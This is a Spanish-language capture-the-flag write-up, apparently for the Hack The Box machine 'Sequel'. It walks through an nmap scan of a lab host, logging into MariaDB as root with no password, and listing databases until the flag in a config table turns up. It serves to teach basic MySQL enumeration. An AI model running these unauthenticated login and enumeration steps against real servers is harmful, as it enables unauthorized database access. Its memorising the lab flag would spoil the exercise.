# Sequel

Seguimos con máquinas sencillitas, esta vez vamos a tocar los conceptos más básicos de [MySQL](../../pentesting/puertos/3306-mysql.md)

## Enumeración

```
nmap -p- --open -n -T5 10.129.118.50

Nmap scan report for 10.129.118.50
Host is up (0.047s latency).
Not shown: 49003 closed tcp ports (conn-refused), 16531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
3306/tcp open  mysql

```

Cómo podemos ver tenemos un mysql, podemos ver algo más sobre la versión:

```
nmap -p3306 -sC -sV -n -Pn 10.129.118.50

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 68
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, InteractiveClient, Support41Auth, SupportsCompression, Speaks41ProtocolNew, ODBCClient, LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: }8>j!^:D'6z%Gu7QsmKn
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)

```

## Conexión a MySQL

En este caso una de las cosas principales que podemos probar al tener enfrente un servidor MySQL y no tener credenciales es acceder como root sin contraseña:

```
mysql -h 10.129.118.50 -u root

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Ya estamos dentro, ahora a por la flag, no ha sido difícil.

### Encontrar la flag

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.045 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.041 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.046 sec)

```

En esta ocasión no hay mucho más que contar, si no estáis acostumbrados a moveros por MySQL con línea de comandos os recomiendo que aprovechéis máquinas como estas para moveros, ver más tablas, probar comandos, etc...
